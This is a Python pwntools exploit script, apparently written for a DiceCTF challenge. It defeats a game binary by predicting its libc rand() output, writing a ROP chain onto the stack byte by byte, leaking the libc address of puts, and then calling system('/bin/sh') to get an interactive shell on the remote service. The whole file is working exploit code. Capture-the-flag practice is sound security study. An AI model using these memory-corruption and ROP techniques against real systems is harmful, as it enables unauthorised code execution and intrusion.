#! /usr/bin/python
from pwn import *
import ctypes as c

context.update(
        arch="amd64",
        endian="little",
        log_level="info",
        os="linux",
        terminal=["xfce4-terminal", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "dicec.tf"
PORT = 32030

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)

def increase_hp(io):
    # is the source given different from the binary? there is no "resort wins" check in the binary
    pass

def clear_bytes(io, l, idx, count):
    while count != 0:
        item = l.rand() % 4
        
        if item != 3:
            dmg = l.rand() % 255

            if dmg != 0:
                # not what we are looking for, throw away
                io.sendline(b"0")
                #io.recvuntil(b">", timeout=0.5)

                continue

        io.sendline(f"{idx}".encode())
        #io.recvuntil(b">",timeout=0.5)

        idx += 1
        count -= 1

def arb_write(io, l, idx, payload):
    used = [ i for i in range(len(payload)) if payload[i] == 0 ]

    while len(payload) > len(used):
        item = l.rand() % 4

        if item == 3:
            io.sendline(b"0")
            #io.recvuntil(b">",timeout=0.5)

            continue

        dmg = l.rand() % 255

        if (256 - dmg) & 255 in payload and dmg != 0:
            char_idx = payload.index((256 - dmg) & 255)

            io.sendline(f"{char_idx + idx}".encode())
            #io.recvuntil(b">",timeout=0.5)

            print(b"Character (" + p8(payload[char_idx]) + f") written... ({len(used) + 1}/{len(payload)})".encode())

            used.append(char_idx)
            payload = payload[:char_idx] + b"\x00" + payload[char_idx + 1:]

            continue

        io.sendline(b"0")
        #io.recvuntil(b">",timeout=0.5)


def exploit(io,e,l):
    # who would have thought that recvuntil wastes so much time LMAOOOO
    # script would time out on remote so I removed recvuntils 
    io.recvuntil(b"r2uwu2 @ ", timeout=0.5)
    pie = int(io.recvline()[:16], 16) - e.sym["print_ui"]
    print(f"===== PIE base: {hex(pie)}")

    libc = c.CDLL("/usr/lib/libc.so.6")
    
    # pop rdi ; pop rbp ; ret
    payload = p64(0x179b + pie) + p64(e.got["puts"] + pie) + p64(0) + p64(0x1030 + pie) 
    payload += p64(0x101a + pie) + p64(e.sym["main"] + pie)

    # ret addr at idx 109 and above
    # create a clean slate
    clear_bytes(io, libc, 109, len(payload))
    arb_write(io, libc, 109, payload)

    clear_bytes(io, libc, 1, 3)

    b = io.recv(500)
    io.recvuntil(b"r2uwu2 wins!\n")
    libcoff = int.from_bytes(io.recvline()[:-1], "little") - l.sym["puts"]

    print(f"===== libc leak: {hex(libcoff)}")

    # pop rdi ; ret
    payload = p64(0x2a3e5 + libcoff)
    payload += p64(next(l.search(b"/bin/sh")) + libcoff)
    payload += p64(0x101a + pie)
    payload += p64(l.sym["system"] + libcoff)

    clear_bytes(io, libc, 109, len(payload))
    arb_write(io, libc, 109, payload)

    clear_bytes(io, libc, 1, 3)

    io.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    l = ELF("./libc.so.6")

    exploit(p,e,l)
